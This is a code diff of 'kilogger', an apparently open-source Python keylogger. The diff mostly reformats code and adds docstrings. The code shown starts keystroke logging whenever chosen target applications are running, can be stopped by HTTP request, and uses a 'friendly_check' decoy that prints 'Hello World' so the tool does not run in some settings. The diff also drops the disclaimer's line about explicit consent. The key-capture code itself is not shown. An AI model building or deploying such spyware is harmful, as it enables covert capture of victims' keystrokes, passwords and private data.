@@ -8,10 +8,12 @@ Functionalities:
 - Stop logger with an HTTP request.
 
 Disclaimer:
-kilogger is intended for educational purposes only. It is not designed for malicious use or unauthorized access.
-By using this project, you agree to use it responsibly and ethically. The developers of this project are not
-responsible for any misuse of this tool, and users are responsible for their actions. This project is provided
-"as is" without warranties. Use with explicit consent and respect for privacy.
+kilogger is intended for educational purposes only. It is not designed
+for malicious use or unauthorized access. By using this project, you
+agree to use it responsibly and ethically.
+The developers of this project are not responsible for any misuse of
+this tool, and users are responsible for their actions. This project
+is provided "as is" without warranties.
 
 Author: Antonino Lorenzo
 Version: 1.0.0
@@ -118,8 +120,8 @@ class ProcessListener(Thread):
     NOT_RUNNING = 'Not Running'
     STOP = '/terminate'
 
-    def __init__(self, targets: list, factory: KLoggerFactory,
-                 sleep: int = 10, *args, **kwargs):
+    def __init__(self, targets: list, factory: KLoggerFactory, *args,
+                 sleep: int = 10, **kwargs):
         super().__init__(*args, **kwargs)
 
         self.__targets = {t: ProcessListener.NOT_RUNNING for t in targets}
@@ -132,31 +134,39 @@ class ProcessListener(Thread):
     def find_process(self):
         """Updates the status [RUNNING, NOT_RUNNING] of the target processes"""
         snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
-        for t in self.__targets.keys():
-            if t in snapshot:
-                self.__targets[t] = ProcessListener.RUNNING
+        for tr_process in self.__targets.keys():
+            if tr_process in snapshot:
+                self.__targets[tr_process] = ProcessListener.RUNNING
             else:
-                self.__targets[t] = ProcessListener.NOT_RUNNING
+                self.__targets[tr_process] = ProcessListener.NOT_RUNNING
 
     def run(self):
-        """"""
+        """
+        Checks if the target process is running every `sleep` seconds,
+        updates the status [RUNNING, NOT_RUNNING] of the target processes
+        and if one of them is running it starts a KLogger with KLoggerFactory.
+        """
         while True:
             self.find_process()
             active_count = 0
-            for t, s in self.__targets.items():
-                logging.info(f'{s}: {t}.')
+            for tr_process, status in self.__targets.items():
+                logging.info(f'{status}: {tr_process}.')
 
-                if s == ProcessListener.RUNNING:
+                if status == ProcessListener.RUNNING:
                     active_count += 1
 
                 # found target process in running processes => start logging
-                if s == ProcessListener.RUNNING and self.__logger_status == ProcessListener.NOT_RUNNING:
+                if (status == ProcessListener.RUNNING and
+                        self.__logger_status == ProcessListener.NOT_RUNNING):
                     self.__logger_status = ProcessListener.RUNNING
                     self.__logger_factory.start()
 
             logging.info(f'Active targets: {active_count}')
-            if active_count == 0 and self.__logger_status == ProcessListener.RUNNING:
+            if (active_count == 0 and
+                    self.__logger_status == ProcessListener.RUNNING):
                 self.__logger_factory.stop()
+
+            # wait to re-execute check
             time.sleep(self.__sleep)
 
     def stop(self):
@@ -246,6 +256,9 @@ def friendly_check():
 
 
 def main():
+    """
+    Main function of the kilogger program.
+    """
     # --- Setup argparse
     parser = argparse.ArgumentParser()
 
@@ -266,7 +279,8 @@ def main():
     )
 
     args = parser.parse_args()
-    if (not (args.force and args.force == 1)) and friendly_check():  # big brain time
+    if ((not (args.force and args.force == 1))
+            and friendly_check()):  # big brain time
         print('Hello World')
     else:
         logging.basicConfig(filename=LOGLOC, level=logging.DEBUG)
@@ -274,9 +288,13 @@ def main():
         # --- Run logger
         logger_factory = KLoggerFactory()
         if args.targets:
-            proc_listener = ProcessListener(args.targets, sleep=DEFAULT_TIMEOUT, factory=logger_factory)
+            proc_listener = ProcessListener(
+                args.targets,
+                sleep=DEFAULT_TIMEOUT,
+                factory=logger_factory
+            )
             proc_listener.start()
-            proc_handler = ListenerSocket(proc_listener)
+            ListenerSocket(proc_listener)
         else:
             # TODO: handle stop maybe with "with"
             logger_factory.start()
